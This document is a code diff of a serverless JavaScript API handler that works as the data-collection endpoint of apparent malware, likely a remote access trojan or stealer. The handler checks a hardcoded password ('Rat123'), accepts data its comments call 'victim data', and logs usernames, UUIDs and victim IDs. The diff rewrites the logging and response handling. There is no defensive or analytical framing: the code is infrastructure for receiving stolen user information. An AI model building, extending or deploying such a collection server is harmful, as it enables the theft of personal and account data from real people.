@@ -1,20 +1,19 @@
 // api/data.js
 export default function handler(req, res) {
-    // Set CORS headers
+    // Enable CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Password');
 
-    // Handle preflight request
+    // Handle preflight
     if (req.method === 'OPTIONS') {
         res.status(200).end();
         return;
     }
 
-    // Only accept POST requests
+    // Only accept POST
     if (req.method !== 'POST') {
-        res.status(405).json({ error: 'Method not allowed' });
-        return;
+        return res.status(405).json({ error: 'Method not allowed' });
     }
 
     try {
@@ -22,35 +21,29 @@ export default function handler(req, res) {
 
         // Check password
         if (password !== "Rat123") {
-            res.status(401).json({ error: 'Unauthorized' });
-            return;
+            return res.status(401).json({ error: 'Unauthorized' });
         }
 
-        // Generate unique ID for this victim
-        const victimId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-        
-        // Add timestamp
-        const victimData = {
-            id: victimId,
-            timestamp: new Date().toISOString(),
-            ...data
-        };
+        // Log the received data (Vercel logs)
+        console.log('=== VICTIM DATA RECEIVED ===');
+        console.log('Time:', new Date().toISOString());
+        console.log('Username:', data.username);
+        console.log('UUID:', data.uuid);
+        console.log('Victim ID:', data.victim_id);
+        console.log('Full data:', JSON.stringify(data, null, 2));
+        console.log('===========================');
 
         // Here you would typically save to a database
-        // For demo, we'll log to console and return
-        console.log('Victim data received:', JSON.stringify(victimData, null, 2));
+        // For now, we'll return success and let the frontend handle it
 
-        // You could also save to a file (but Vercel is stateless)
-        // Better to use a database like MongoDB, Supabase, etc.
-
-        res.status(200).json({ 
-            status: 'success',
+        return res.status(200).json({ 
+            success: true, 
             message: 'Data received',
-            victim_id: victimId
+            victim_id: data.victim_id 
         });
 
     } catch (error) {
-        console.error('Error processing data:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        console.error('Error:', error);
+        return res.status(500).json({ error: 'Internal server error' });
     }
 }
